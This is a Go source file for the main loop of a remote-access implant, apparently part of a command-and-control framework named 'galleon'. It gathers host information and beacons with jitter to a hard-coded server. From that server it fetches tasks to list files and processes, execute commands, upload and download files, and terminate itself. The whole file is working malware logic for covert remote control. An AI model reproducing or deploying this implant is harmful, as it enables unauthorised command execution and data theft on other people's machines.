package main

import (
	"encoding/json"
	"fmt"
	"galleon/agent_helper"
	"time"
	"os"
)

func ParseTasks(serverUrl string, tasking string) (string, error) {

	var tasks []map[string]interface{}
	err := json.Unmarshal([]byte(tasking), &tasks)
	if err != nil {
		return "", err
	}

	for _, taskData := range tasks {
		url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
		TaskHandler(taskData, url, serverUrl)
	}
	return "", nil
}

func TaskHandler(taskData map[string]interface{}, url string, serverUrl string) {
	switch taskData["task"] {
		case "ls":
			agent_helper.LsHandler(url, taskData)
		case "ps":
			agent_helper.PsHandler(url, taskData)
		case "exec_bg":
			agent_helper.ExecBgHandler(url, taskData)
		case "exec_fg":
			agent_helper.ExecFgHandler(url, taskData)
		case "reconfig":
			agent_helper.ReconfigHandler(url, taskData)
		case "kill":
			agent_helper.SendDeathMessage(serverUrl, taskData["session"].(string))
			agent_helper.DataShipper(url, taskData, "true")
			agent_helper.TerminateImplant()
		case "download":
			agent_helper.DownloadHandler(url, taskData)
		case "upload":
			agent_helper.UploadHandler(url, taskData)
		}
}



func main() {
	
	os.Clearenv()
	retryCounter := 0
	serverUrl := "https://192.168.15.45:8000"
	initialInfo := agent_helper.GatherInfo()
	time.Sleep(time.Duration(agent_helper.CallbackTimer.StartDelay) * time.Second)
	agent_helper.InitialCheckin(serverUrl, initialInfo)
	agent_helper.SigHandler(serverUrl, initialInfo.Session)

	for {
		nextInterval := agent_helper.RandomJitter(agent_helper.CallbackTimer.Callback_freq, agent_helper.CallbackTimer.Jitter)
		timer := time.NewTimer(nextInterval)

		<-timer.C
		resp, err := agent_helper.CheckIn(serverUrl, initialInfo.Session)
		if err != nil {
			retryCounter += 1
			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
				agent_helper.TerminateImplant()
			}
			continue
		}
		if resp != 200 && resp != 301 {
			retryCounter += 1
			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
				agent_helper.TerminateImplant()
			}
			continue
		}
		if resp == 301 {
			// we have tasking
			tasking, err := agent_helper.FetchTasking(serverUrl, initialInfo.Session)
			if err != nil {
			} else {
				ParseTasks(serverUrl, tasking)
			}
			continue
		}
		retryCounter = 0
		timer.Stop()
	}
}

